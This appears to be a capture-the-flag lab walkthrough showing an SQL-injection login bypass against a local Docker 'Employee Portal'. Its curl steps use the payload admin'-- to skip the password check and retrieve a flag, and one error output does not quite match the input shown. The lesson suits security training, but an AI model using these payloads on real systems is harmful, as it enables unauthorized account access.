# Walkthrough: ORM Injection

## Setup

```bash
docker compose up --build -d
```

## Step 1: Enumerate

```bash
curl http://localhost:8080/
```

```json
{
  "service": "Employee Portal v2.1",
  "endpoints": [
    "POST /login  -- body: username=<u>&password=<p>"
  ],
  "hint": "Login is for authorized employees only."
}
```

One endpoint: `/login`.

## Step 2: Confirm Rejection

```bash
curl -X POST http://localhost:8080/login \
  -d "username=admin&password=wrongpassword"
```

```json
{
  "success": false,
  "error": "Invalid credentials"
}
```

Normal login fails without the correct password.

## Step 3: Probe for SQL Injection

```bash
curl -X POST http://localhost:8080/login \
  -d "username='&password=x"
```

```json
{
  "success": false,
  "error": "unrecognized token: \"'admin'\" ..."
}
```

The SQL error confirms the username is interpolated directly into the query.

## Step 4: Comment Bypass

```bash
curl -X POST http://localhost:8080/login \
  --data-urlencode "username=admin'--" \
  --data-urlencode "password=anything"
```

```json
{
  "success": true,
  "user": "admin",
  "role": "admin",
  "flag": "POC{<32 hex chars>}"
}
```

## Explanation

The injected query becomes:

```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

The `--` comments out the password check. The database returns the admin row, the application trusts the result, and the flag is returned.

## Automated Exploit

```bash
python3 exploit/exploit.py http://localhost:8080
```
